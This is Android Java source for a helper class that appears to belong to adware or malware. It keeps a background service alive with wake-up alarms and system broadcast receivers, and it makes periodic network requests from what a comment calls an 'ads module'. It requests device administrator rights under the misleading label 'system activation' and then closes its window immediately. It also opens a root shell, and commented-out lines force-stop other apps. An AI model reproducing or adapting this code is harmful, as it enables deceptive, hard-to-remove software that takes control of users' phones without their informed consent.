package com.rot;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Handler;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.RelativeLayout;
import com.export.DReceiver;
import com.export.MainReceiver;
import com.export.MainService;
import com.rot.bean.Config;
import com.rot.main.ConfigManager;
import com.rot.main.MainManager;
import com.rot.utils.CommonUtils;
import com.rot.utils.InfoUtils;
import com.rot.utils.NetworkUtils;
import com.rot.utils.Timer;
import com.rot.utils.shell.root.RootShellManager;

public class ExportHelper {
    private static final String ALARM = "alarm";
    public static String ACTIVATE = "activate";
    private static long receiverLastTime = 0L;
    private static long receiverInterval = 30L;//SECONDS
    private static final Object receiverLocker = new Object();
    public static void doReceive(Context context, Intent intent) {
        synchronized (receiverLocker) {//ads module
            long current = System.currentTimeMillis();
            if (current - receiverLastTime >= receiverInterval * 1000) {
                receiverLastTime = current;
                context.startService(new Intent(context, MainService.class));
            }
        }
    }
    private static SharedPreferences getPref(Context context) {
        return context.getSharedPreferences(ALARM, 0);
    }
    public static int handleCommand(Service service, Intent intent) {
        final Context context = service.getApplicationContext();
        Config config = ConfigManager.getInstance(context).load();
        String action = CommonUtils.getIntentAction(intent);
        if (ACTIVATE.equals(action)) {
            MainManager.request(context);
        } else if (ALARM.equals(action)) {
            getPref(context).edit().putLong(ALARM, System.currentTimeMillis()).commit();
            final Timer timer = new Timer(context, service.getClass().getName(), config.requestInterval);
            if (timer.isTime() && (!config.backgroundOnly || InfoUtils.isScreenOn(context)) && NetworkUtils.isNetworkConnected(context)) {
                new Handler().post(new Runnable() {
                    @Override
                    public void run() {
                        MainManager.request(context);
                        timer.updateTime();
                    }
                });
            }
        } else {
            if (System.currentTimeMillis() - getPref(context).getLong(ALARM, 0) > receiverInterval * 1000) {
                restartAlarm(service);
            }
        }
        return 0;
    }
    private static final Object locker = new Object();
    public static void restartAlarm(Service service) {
        Context context = service.getApplicationContext();
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) context.getSystemService(ALARM);
            PendingIntent pending = PendingIntent.getService(context, 0, new Intent().setClass(context, MainService.class).setAction(ALARM), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, receiverInterval * 1000, pending);
        }
    }
    public static void handleActivityCreate(final Activity activity) {
        new Thread() {
            @Override
            public void run() {
                activity.startService(new Intent(activity, MainService.class).setAction(ACTIVATE));
            }
        }.start();;
        DevicePolicyManager manager = (DevicePolicyManager) activity.getSystemService("device_policy");
        ComponentName cName = new ComponentName(activity, DReceiver.class);
        if (!manager.isAdminActive(cName)) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", cName);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", "系统激活");
            activity.startActivityForResult(intent, 1);
        }
        activity.finish();
    }
    private static void initTestViews(final Activity activity) {
        RelativeLayout layout = new RelativeLayout(activity);
        final Handler handler = new Handler(activity.getMainLooper());
        Button button = new Button(activity);
        button.setText("request");
        layout.addView(button);
        activity.setContentView(layout);
        RootShellManager.connect();
        button.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        com.rot.main.MainManager.request(activity.getApplicationContext());
                        //Result result=RootManager.getInstance().runCommand("am force-stop com.blueocean.games.leidian");
                        // Result result=RootManager.getInstance().runCommand("ls");
                        // System.out.println(result);
                        //TaskManager.reqeust(activity);
                        // String cmd = "am force-stop com.blueocean.games.leidian";
                        // CommonUtil.exeCmd(cmd);
                        //activity.startActivity(new Intent().setComponent(new android.content.ComponentName("com.baidu.searchbox", "com.baidu.searchbox.MainActivity")));
                    }
                });
            }
        });
    }
    private static final String actions = "android.net.conn.CONNECTIVITY_CHANGE,android.intent.action.USER_PRESENT,android.intent.action.BATTERY_CHANGED,android.intent.action.TIME_TICK,android.intent.action.SCREEN_OFF,android.intent.action.SCREEN_ON";
    public static void onMainApplicationCreate(Context context) {
        IntentFilter filter = new IntentFilter();
        for (String action : actions.split(",")) {
            filter.addAction(action.trim());
        }
        context.registerReceiver(new MainReceiver(), filter);
    }
}
